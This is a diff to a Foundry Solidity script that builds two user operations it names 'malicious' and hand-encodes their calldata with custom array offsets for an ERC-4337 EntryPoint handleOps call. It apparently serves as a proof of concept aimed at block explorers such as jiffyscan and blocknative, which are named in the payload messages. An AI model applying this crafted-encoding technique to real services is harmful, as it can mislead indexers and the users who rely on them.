@@ -19,6 +19,48 @@ contract TestScript is Script {
     }
 
     function run() public {
+        console.log(block.chainid);
+        uint256 privKey = vm.envUint("PRIVATE_KEY");
+        address payable beneficiary = payable(vm.addr(vm.envUint("PRIVATE_KEY")));
+        vm.startBroadcast(privKey);
+        sender = TestSender(payable(0x477A1860c3aC1920d4Cd6DD2782657342Ff2E640));
+        bytes memory data1 = packMaliciousUserOp(
+            2,
+            abi.encodeWithSelector(TestSender.execute.selector, beneficiary, 0, "this one is for you jiffyscan"),
+            100000,
+            100000,
+            100000,
+            70000000000,
+            70000000000
+        );
+
+        bytes memory data2 = packMaliciousUserOp(
+            3,
+            abi.encodeWithSelector(TestSender.execute.selector, beneficiary, 0, "this one is for you blocknative"),
+            100000,
+            100000,
+            100000,
+            70000000000,
+            70000000000
+        );
+
+        bytes memory c = abi.encodePacked(
+            entrypoint.handleOps.selector,
+            uint256(0x40),
+            bytes12(0),
+            address(beneficiary),
+            uint256(2), // array length
+            uint256(0x60), // 1st elem offset
+            uint256(0x60 + data1.length),
+            data1,
+            data2
+        );
+        (bool success,) = address(entrypoint).call(c);
+        require(success, "reverted");
+
+    }
+
+    function runOld() public {
         console.log("CHAINID");
         console.log(block.chainid);
         uint256 privKey = vm.envUint("PRIVATE_KEY");
